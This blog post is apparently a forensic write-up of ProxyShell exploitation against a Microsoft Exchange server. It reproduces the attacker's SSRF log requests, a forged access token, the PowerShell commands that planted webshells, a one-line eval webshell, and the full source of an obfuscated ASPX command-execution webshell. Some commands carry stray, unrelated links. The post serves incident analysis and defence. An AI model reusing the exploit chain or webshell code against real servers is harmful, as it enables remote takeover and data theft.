---
layout: post
title:  "ProxyShell vulnerabilities exploited"
---






## **Initial access**

To create a web shell on a Microsoft exchange server by exporting from a mailbox, first, the attacker needs to create an item within a mailbox. The attacker usually abuses the **Autodiscover** service by using for example, Metasploit implementation of the **CVE** payload, however, the **Autodiscover** is a feature which allows Outlook administration to configure and mange user profiles for Outlook. The attacker abuses the **Autodiscover** service to leak an Outlook user’s Distinguished Name (DN). The DN is a native address format for recipients in Microsoft Exchange Server, also it is one of the addressing formats for objects within Active Directory in Microsoft Windows Server. The attacker requests a DN to leak the user security identifier (SID) to get access token into exchange server to obtain access token into exchange server, and the (**Autodiscover**) service is a MS Exchange service that is typically used to look up **EWS** endpoint URL. Consequently, a draft email message is created in the user mailbox along with a webshell attached as a file, which is later extracted and accessed via **HTTP** request.

---

## **CVE-2021-34473**

The vulnerability allows a malicious actor to open a mailbox of another user through the browser, by providing the mailbox address in the URL, this vulnerability provides full access to backend of the exchange server.
Besides, the CVE-2021-34473 has a capability to use the string `Autodiscover/Autodiscover.json`  to pass the email address field in the URL. This gives the malicious actor arbitrary access to the backend URLs as **NT AUTHORITY/SYSTEM.**
Moreover, the malicious actor preformed Server Side Request Forgery attack against **Autodiscover** on (darksys-exch1) Exchange server then requested an email address to start the attack. If the HTTP status code 200 is returned, it means the legacy DN was successfully returned and the malicious actor can proceed to get the user SID using the legacy DN. The table below demonstrates the request to retrieve the legacy DN.

```csharp
***2021-03-03 02:13:48 10.10.4.102 POST /autodiscover/autodiscover.json @fucky0u.edu/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu&CorrelationID=<empty>;&cafeReqId=3341f5-feerd-4b84-a736-bd1b3245df; 443 -Mozilla/5.0+XXXXXXXXX+(KHTML,+like+Gecko)+Chrome/92.xxxxxx1+Safari/xxx.36. - 200 0 0 64***
```

Subsequently, the malicious actor sent another HTTP POST request to get the SID by performing SSRF attack against Messaging Application Program Interface Electronic Messaging System Microsoft Data Base . The legacy DN is passed as binary in the body of the http request and random values are appended to the end of body. This malformed **SSRF** attack will return the SID of the user. The table below demonstrates the HTTP POST request to retrieve the user SID. The The following IIS log shows the attacker's activity.

```csharp
 ***2021-03-03 02:13:48 10.10.4.102 POST /autodiscover/autodiscover.json @fucky0u.edu/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu&CorrelationID=<empty>;&cafeReqId=3341f5-feerd-4b84-a736-bd1b3245df; 443 -Mozilla/5.0+XXXXXXXXX+(KHTML,+like+Gecko)+Chrome/92.xxxxxx1+Safari/xxx.36. - 200 0 0 64200 0 0 28***
```

```csharp
***2021-03-03 15:14:03 10.10.4.102 POST /autodiscover/autodiscover.json @fucky0u.edu/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu&CorrelationID=<empty>;&cafeReqId=3341f5-feerd-4b84-a736-bd1b3245df; 443 -Mozilla/5.0+XXXXXXXXX+(KHTML,+like+Gecko)+Chrome/92.xxxxxx1+Safari/xxx.36. - 200 0 0 64 - 200 0 0 16***
```

```csharp
***2021-03-03 15:15:39 10.10.4.102 POST /autodiscover/autodiscover.json @fucky0u.edu/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu&CorrelationID=<empty>;&cafeReqId=3341f5-feerd-4b84-a736-bd1b3245df; 443 -Mozilla/5.0+XXXXXXXXX+(KHTML,+like+Gecko)+Chrome/92.xxxxxx1+Safari/xxx.36. - 200 0 0 64 200 0 0 32***
```

---

## **CVE-2021-34523**

The malicious actor exploited the vulnerability **CVE-2021-34523** on exchange server to downgrade  the privileges of the Exchange PowerShell Backend, and this gives the malicious actor the ability to execute powershell remotely as administrator. This feature is natively built into Microsoft Exchange which is considered an administrative tool. However, the **CVE-2021-34473** grants access to the ‘NT **AUTHORITY/SYSTEM**’ user which doesn’t have a mailbox which is needed for the PowerShell backend.  Therefore, the malicious actor utilized “Hamad@darksys.com” mailbox to use the Powershell backend.

Moreover, the PowerShell backend checks for the “**X-CommonAccessToken**” header in the incoming requests. If the header does not exist, another method is utilized to obtain a “**CommonAccessToken**”. This method checks for the “X-Rps-CAT” parameter in the incoming request, and if present, this confirms it is a valid **CommonAccessToken**. With the previously collected information on the target mailbox or default information from built-in mailboxes, passing of a valid **X-Rps-CAT** value is trivial.

By passing this value to the PowerShell backend with the previously successful access token, a malicious actor can downgrade from the **NT AUTHORITY/SYSTEM** account to the target user Hamad@darksys.com”. The following table demonstrates exploitation evidence of the exploit being used from the (darksys-exch) IIS log.

Therefore, the malicious actor utilized “Hamad@darksys.com” mailbox to use the Powershell backend command as following:

```csharp
***CAT=VgHvv71UB1dpbmRvd3ND77+9QQVCYXNpY0xIYW1hZEBkYXJrc3lzLmNvbSxTLTEtNS0yMS00MzQ1MzQ1MzQ1My00MzU0MzUzNDUtMTQ4MjAyNzEyOS01MDBHBO+/ve+/ve+/vQfvv73vv73vv70HUy0xLTEtMAfvv73vv73vv70HUy0xLTUtMgfvv73vv73vv70IUy0xLTUtMTEH77+977+977+9CFMtMS01LTE=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu&CorrelationID=<empty>;&cafeReqId=fcafeReqId=3341f5-feerd-4b84-a736-bd1b3245df***
```

```csharp
***2021-03-03 15:20:53 10.10.4.102 POST /autodiscover/autodiscover.json @evil.corp/powershell/?X-Rps-CAT=CAT=VgHvv71UB1dpbmRvd3ND77+9QQVCYXNpY0xIYW1hZEBkYXJrc3lzLmNvbSxTLTEtNS0yMS00MzQ1MzQ1MzQ1My00MzU0MzUzNDUtMTQ4MjAyNzEyOS01MDBHBO+/ve+/ve+/vQfvv73vv73vv70HUy0xLTEtMAfvv73vv73vv70HUy0xLTUtMgfvv73vv73vv70IUy0xLTUtMTEH77+977+977+9CFMtMS01LTE=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu&CorrelationID=<empty>;&cafeReqId=fcafeReqId=3341f5-feerd-4b84-a736-bd1b3245df***
```

In the IIS logs “2021-09-05 15:13:49 ***10.10.4.102*** GET”, the field “**X-Rps-CAT**” contains the bases64 string, decoding it reveals the user name and the user ID as following:

```csharp
***Vï¿½TWindowsCï¿½ABasicLHamad@darksys.com,S-1-5-21-43453453453-435435345-1482027129-500Gï¿½ï¿½ï¿½ï¿½ï¿½ï¿½S-1-1-0ï¿½ï¿½ï¿½S-1-5-2ï¿½ï¿½ï¿½S-1-5-11ï¿½ï¿½ï¿½S-1-5-1***
```

Moreover, once the malicious actor has downgraded the privilege of the Exchange powershell Backend, the webshells “blank.aspx”, and “ss.aspx” are uploaded on the path “C:\\inetpub\\wwwroot\\aspnet” by using the “**New-ExchangeCertificate**” technique. Furthermore, the malicious actor used the “New-ExchangeCertificate” cmdlet to save a webshell code within a certificate request via the system certificate store. The webshell code is provided in the ‘SubjectName’ parameter and it will be saved to the disk at path specified by the ‘RequestFile’ parameter. The webshells written by this have been observed on disk with a certificate request extension (.aspx.req). It has been Identified that files on variant paths with the extension ‘ss.aspx.req’, and ‘blank.aspx.req’ which indicates certificate request files saved as ASPX. The below are evidences of command execution from **MSExchange Management** Artifcats:

```csharp
***New-ExchangeCertificate\n-GenerateRequest 'True' -RequestFile 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\blank.aspx>' -SubjectName 'System.Security.Cryptography.X509Certificates.X500DistinguishedName' -BinaryEncoded 'True' -DomainName ('xxxxx[.darksys.com](http://smo.gov.sa/)
')\darksys.com[/darksys.com/](http://nsmo.sa/SMO-OU/SMO)
xxxxx IT/Hamad\S-1-5-21-43453453453-435435345-1482027129-500\nRemote-PowerShell-Unknown\n10544***
```

Although, the technique “**New-ExchangeCertificate**” was used multiple times to create webshells, however, the certificates were found in system registry paths:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\REQUEST\Certificates\B7B88BD73AD03FF23423432423523534565D34C”.`
- `“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\REQUEST\Certificates\E8B90934234BB9527DA8CA5B7CB4AE280A505C184217`”.

![System registry](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled.png)

System registry

The following figure demonstrates evidence of a certificate obtained from the system registry.

![Certificate found with webshell embedded inside](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%201.png)

Certificate found with webshell embedded inside

The extracted webshell which was embedded in the certificate.

![Webshell post-extracting from certificate](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%202.png)

Webshell post-extracting from certificate

---

## **CVE-2021-31207**

This vulnerability allows the attacker to write files. As soon as the role “Import Export Mailbox” is assigned to the impersonated user, and the attacker has the ability to execute PowerShell commands. The command “**New-MailboxExportRequest**” can be used to export the target mailboxes to any path as a **PST** file with extension “.aspx”. This will decodes the encoded web shell in the email and writes it to the newly created .aspx file.

```csharp
New-ManagementRoleAssignment\n-Role 'Mailbox Import Export' -User 'Hamad@xxxxx.darksys.com](/)
'\[xxxxx.xxx/xxxxx-OU/](http://darksys.com)
xxxxx  Hamad A. Admin\S-1-5-21-43453453453-435435345-1482027129-500\nRemote-PowerShell-Unknown\n1054
```

**MSExchange Management** "MailboxExportRequest" artifact snapshot:

```csharp
New-MailboxExportRequest\n-Mailbox 'Hamad@xxxxx.darksys.com' -FilePath '\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet\\p433zrwewrvmcv.aspx' -IncludeFolders ('#Drafts#') -ContentFilter 'Subject -eq 'p433zrwewrvmcv''\nxxxxx.sa/xxxxx-OU/xxxxx IT/HamadA. Admin\nS-1-5-21-304353458-1814545535-1482027129-1506\nS-1-5-21-304354354108-1817245355-14820435349-1506\nRemote-PowerShell-Unknown\n10544
```

```csharp
New-MailboxExportRequest\n-Mailbox 'Hamad@xxxxx[.darksys.com](http://smo.gov.sa/)
' -FilePath '\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet\\p433zrwewrvmcv.aspx' -IncludeFolders ('#Drafts#') -ContentFilter 'Subject -eq 'rksgzvccymzrvmcv''\[nxxxxx.sa/xxxxx-OU/](http://nsmo.sa/SMO-OU/SMO)
xxxxx Hamad A. Admin\S-1-5-21-43453453453-435435345-1482027129-500\nRemote-PowerShell-Unknown\n10544
```

Moreover, the malicious actor exported 'Hamad@darksys.com
'  mailbox to the path “C:\\inetpub\\wwwroot\\aspnet\\ on exchange server. This results in a PST file with .aspx extension: rksgzvccymzrvmcv.aspx. Under normal circumstances, “p433zrwewrvmcv.aspx” would have been capable of executing javascript code since the attached file.

**FileAttachment.txt** in the draft email is usually a webshell, however, since this was the first email created by the malicious actor, refer to the below figure. created draft emails have a webshell in the attachment.

![The Export email that contains a webshell.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%203.png)

The Export email that contains a webshell.

drafts emails created by the malicious actor contain the same webshell. For instance, the PST file “p433zrwewrvmcv.aspx” contains JavaScript code with RCE:

```csharp
script language = 'JScript' runat = 'server' >function Page_Load() {    eval(Request['exec_code'], 'unsafe');    Response.End;.}< /script>
```

![The PST File with plain JavaScript code](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%204.png)

The PST File with plain JavaScript code


---

# **Webshell demonstration Functionality**

The webshell file was uploaded on Exchange server which contains base64 encoded code. However, 

when the webshell is accessed using a browser, two textboxes will be displayed along with a button. One textbox is for the path, usually it is “cmd.exe”, the other textbox is for the arguments that will be passed to the “cmd.exe”. After pressing the button, it will execute the function “xmmmsjowe” on server. This will create a new process for command prompt and execute the command. The result of the command will be sent to the client the label with id “fldfldfw” will show the result indicating whether the command was successfully executed or not.

```vbnet
<%@ Page LanGuaGe='VB' Debug='tRUe' %>
 <%@ imPOrt NamESpAce='system.IO' %>
 <%@ imPOrt NamESpAce='System.Diagnostics' %>
 <scRIPt runat='server'>
 Sub xmmmsjowe()
   Dim wertewt AS NeW PrOCesS()
   Dim wertewtewe As New ProCeSsStaRtInFo(zxcerwew.teXt)
   wertewtewe.UsESheLlExeCuTe=fALse
   wertewtewe.RedIRectStaNDardOuTPut=tRUe
   wertewt.StARtInFo = wertewtewe
   wertewtewe.ArGumENts=vcxwsasddd.teXt
   wertewt.StARt()
   Dim xxwertewtewe As StreamReader=wertewt.StanDardOutput
   Dim xxwrrertewtewe As StRIng = xxwertewtewe.ReAdtOEnd()
   wertewt.Close()
   fldfldfw.text= xxwrrertewtewe
 End Sub
 </scRIPt>
 <html>
 <body>
 <style>#div1{background:white}</style><style>#div1{width:100%}</style><style>#div1{height:100%}</style><style>#div1{position:fixed}</style>
 <div id='div1'></div>
 <form runat='server'>
 <asp:TeXtBOx id='zxcerwew' runat='server' Width='300px'></asp:TeXtBOx>
 <asp:TeXtBOx id='vcxwsasddd' runat='server' Width='300px'></asp:TeXtBOx>
 <p><asp:Button id='Button' onclick='xmmmsjowe' runat='server' Width='100px'></asp:Button>
 <p><asp:Label id='fldfldfw' runat='server'></asp:Label>
 </form>
 </body>
 </html>
```
